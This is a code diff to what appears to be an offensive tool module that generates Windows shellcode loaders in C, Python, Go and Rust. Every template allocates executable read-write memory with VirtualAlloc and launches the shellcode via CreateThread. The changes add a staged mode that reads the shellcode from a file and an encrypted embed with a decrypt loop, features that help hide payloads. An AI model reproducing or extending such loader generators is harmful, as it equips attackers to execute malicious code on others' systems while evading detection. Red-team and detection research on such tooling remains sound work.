@@ -14,14 +14,19 @@ from . import _render
 
 _render.self_register(__name__, "win_malloc_rwx")
 
+# {sc_embed}    — global declarations (encrypted array + key, or empty for staged)
+# {sc_init}     — in-main init block (decrypt loop or file-reading code)
+# {main_decl}   — main() signature (void or int argc, char *argv[])
 _C_TEMPLATE = """\
 #include <windows.h>
 #include <stdio.h>
 #include <string.h>
+#include <stdlib.h>
 
-{sc_array}
+{sc_embed}
 
-int main(void) {{
+{main_decl} {{
+    {sc_init}
     LPVOID mem = VirtualAlloc(NULL, sc_len,
                               MEM_COMMIT | MEM_RESERVE,
                               PAGE_EXECUTE_READWRITE);
@@ -71,18 +76,21 @@ if not ht:
 kernel32.WaitForSingleObject(ctypes.c_void_p(ht), 0xFFFFFFFF)
 """
 
-
+# {sc_embed}    — package-level declarations (or empty for staged)
+# {sc_init}     — first statement(s) in main (decrypt loop or file-reading)
+# {sc_imports}  — extra import entries, e.g. \n\t"os" for staged
 _GO_TEMPLATE = """\
 package main
 
 import (
 \t"syscall"
-\t"unsafe"
+\t"unsafe"{sc_imports}
 )
 
-{sc_bytes}
+{sc_embed}
 
 func main() {{
+\t{sc_init}
 \tk32           := syscall.NewLazyDLL("kernel32.dll")
 \tpVirtualAlloc := k32.NewProc("VirtualAlloc")
 \tpVirtualFree  := k32.NewProc("VirtualFree")
@@ -105,6 +113,7 @@ func main() {{
 }}
 """
 
+# {sc_bytes} is placed inside fn main() — single block covering decl + decrypt
 _RS_TEMPLATE = """\
 #![allow(non_snake_case)]
 use std::ptr;
@@ -139,21 +148,33 @@ fn main() {{
 """
 
 
-def generate_c(shellcode: bytes) -> str:
-    """Return a compilable C loader for shellcode using VirtualAlloc(RWX) + CreateThread."""
-    return _C_TEMPLATE.format(sc_array=_render.c_array_literal(shellcode, "sc"))
+def generate_c(shellcode: bytes, staged: bool = False) -> str:
+    """Return a compilable C loader using VirtualAlloc(RWX) + CreateThread."""
+    if staged:
+        embed, init = _render.c_staged_sc("sc")
+        main_decl = "int main(int argc, char *argv[])"
+    else:
+        embed, init = _render.c_sc_block(shellcode, "sc")
+        main_decl = "int main(void)"
+    return _C_TEMPLATE.format(sc_embed=embed, sc_init=init, main_decl=main_decl)
 
 
-def generate_python(shellcode: bytes) -> str:
+def generate_python(shellcode: bytes, staged: bool = False) -> str:
     """Return a Python ctypes loader using VirtualAlloc(RWX) + CreateThread."""
-    return _PY_TEMPLATE.format(sc_bytes=_render.python_bytes_literal(shellcode, "sc"))
+    sc_bytes = _render.py_staged_sc("sc") if staged else _render.py_sc_block(shellcode, "sc")
+    return _PY_TEMPLATE.format(sc_bytes=sc_bytes)
 
 
-def generate_go(shellcode: bytes) -> str:
+def generate_go(shellcode: bytes, staged: bool = False) -> str:
     """Return a Go loader using VirtualAlloc(RWX) + CreateThread."""
-    return _GO_TEMPLATE.format(sc_bytes=_render.go_bytes_literal(shellcode, "sc"))
+    if staged:
+        embed, init, imports = _render.go_staged_sc("sc")
+    else:
+        embed, init, imports = _render.go_sc_block(shellcode, "sc")
+    return _GO_TEMPLATE.format(sc_embed=embed, sc_init=init, sc_imports=imports)
 
 
-def generate_rust(shellcode: bytes) -> str:
+def generate_rust(shellcode: bytes, staged: bool = False) -> str:
     """Return a Rust loader using VirtualAlloc(RWX) + CreateThread."""
-    return _RS_TEMPLATE.format(sc_bytes=_render.rust_bytes_literal(shellcode, "sc"))
+    sc_bytes = _render.rust_staged_sc("sc") if staged else _render.rust_sc_block(shellcode, "sc")
+    return _RS_TEMPLATE.format(sc_bytes=sc_bytes)
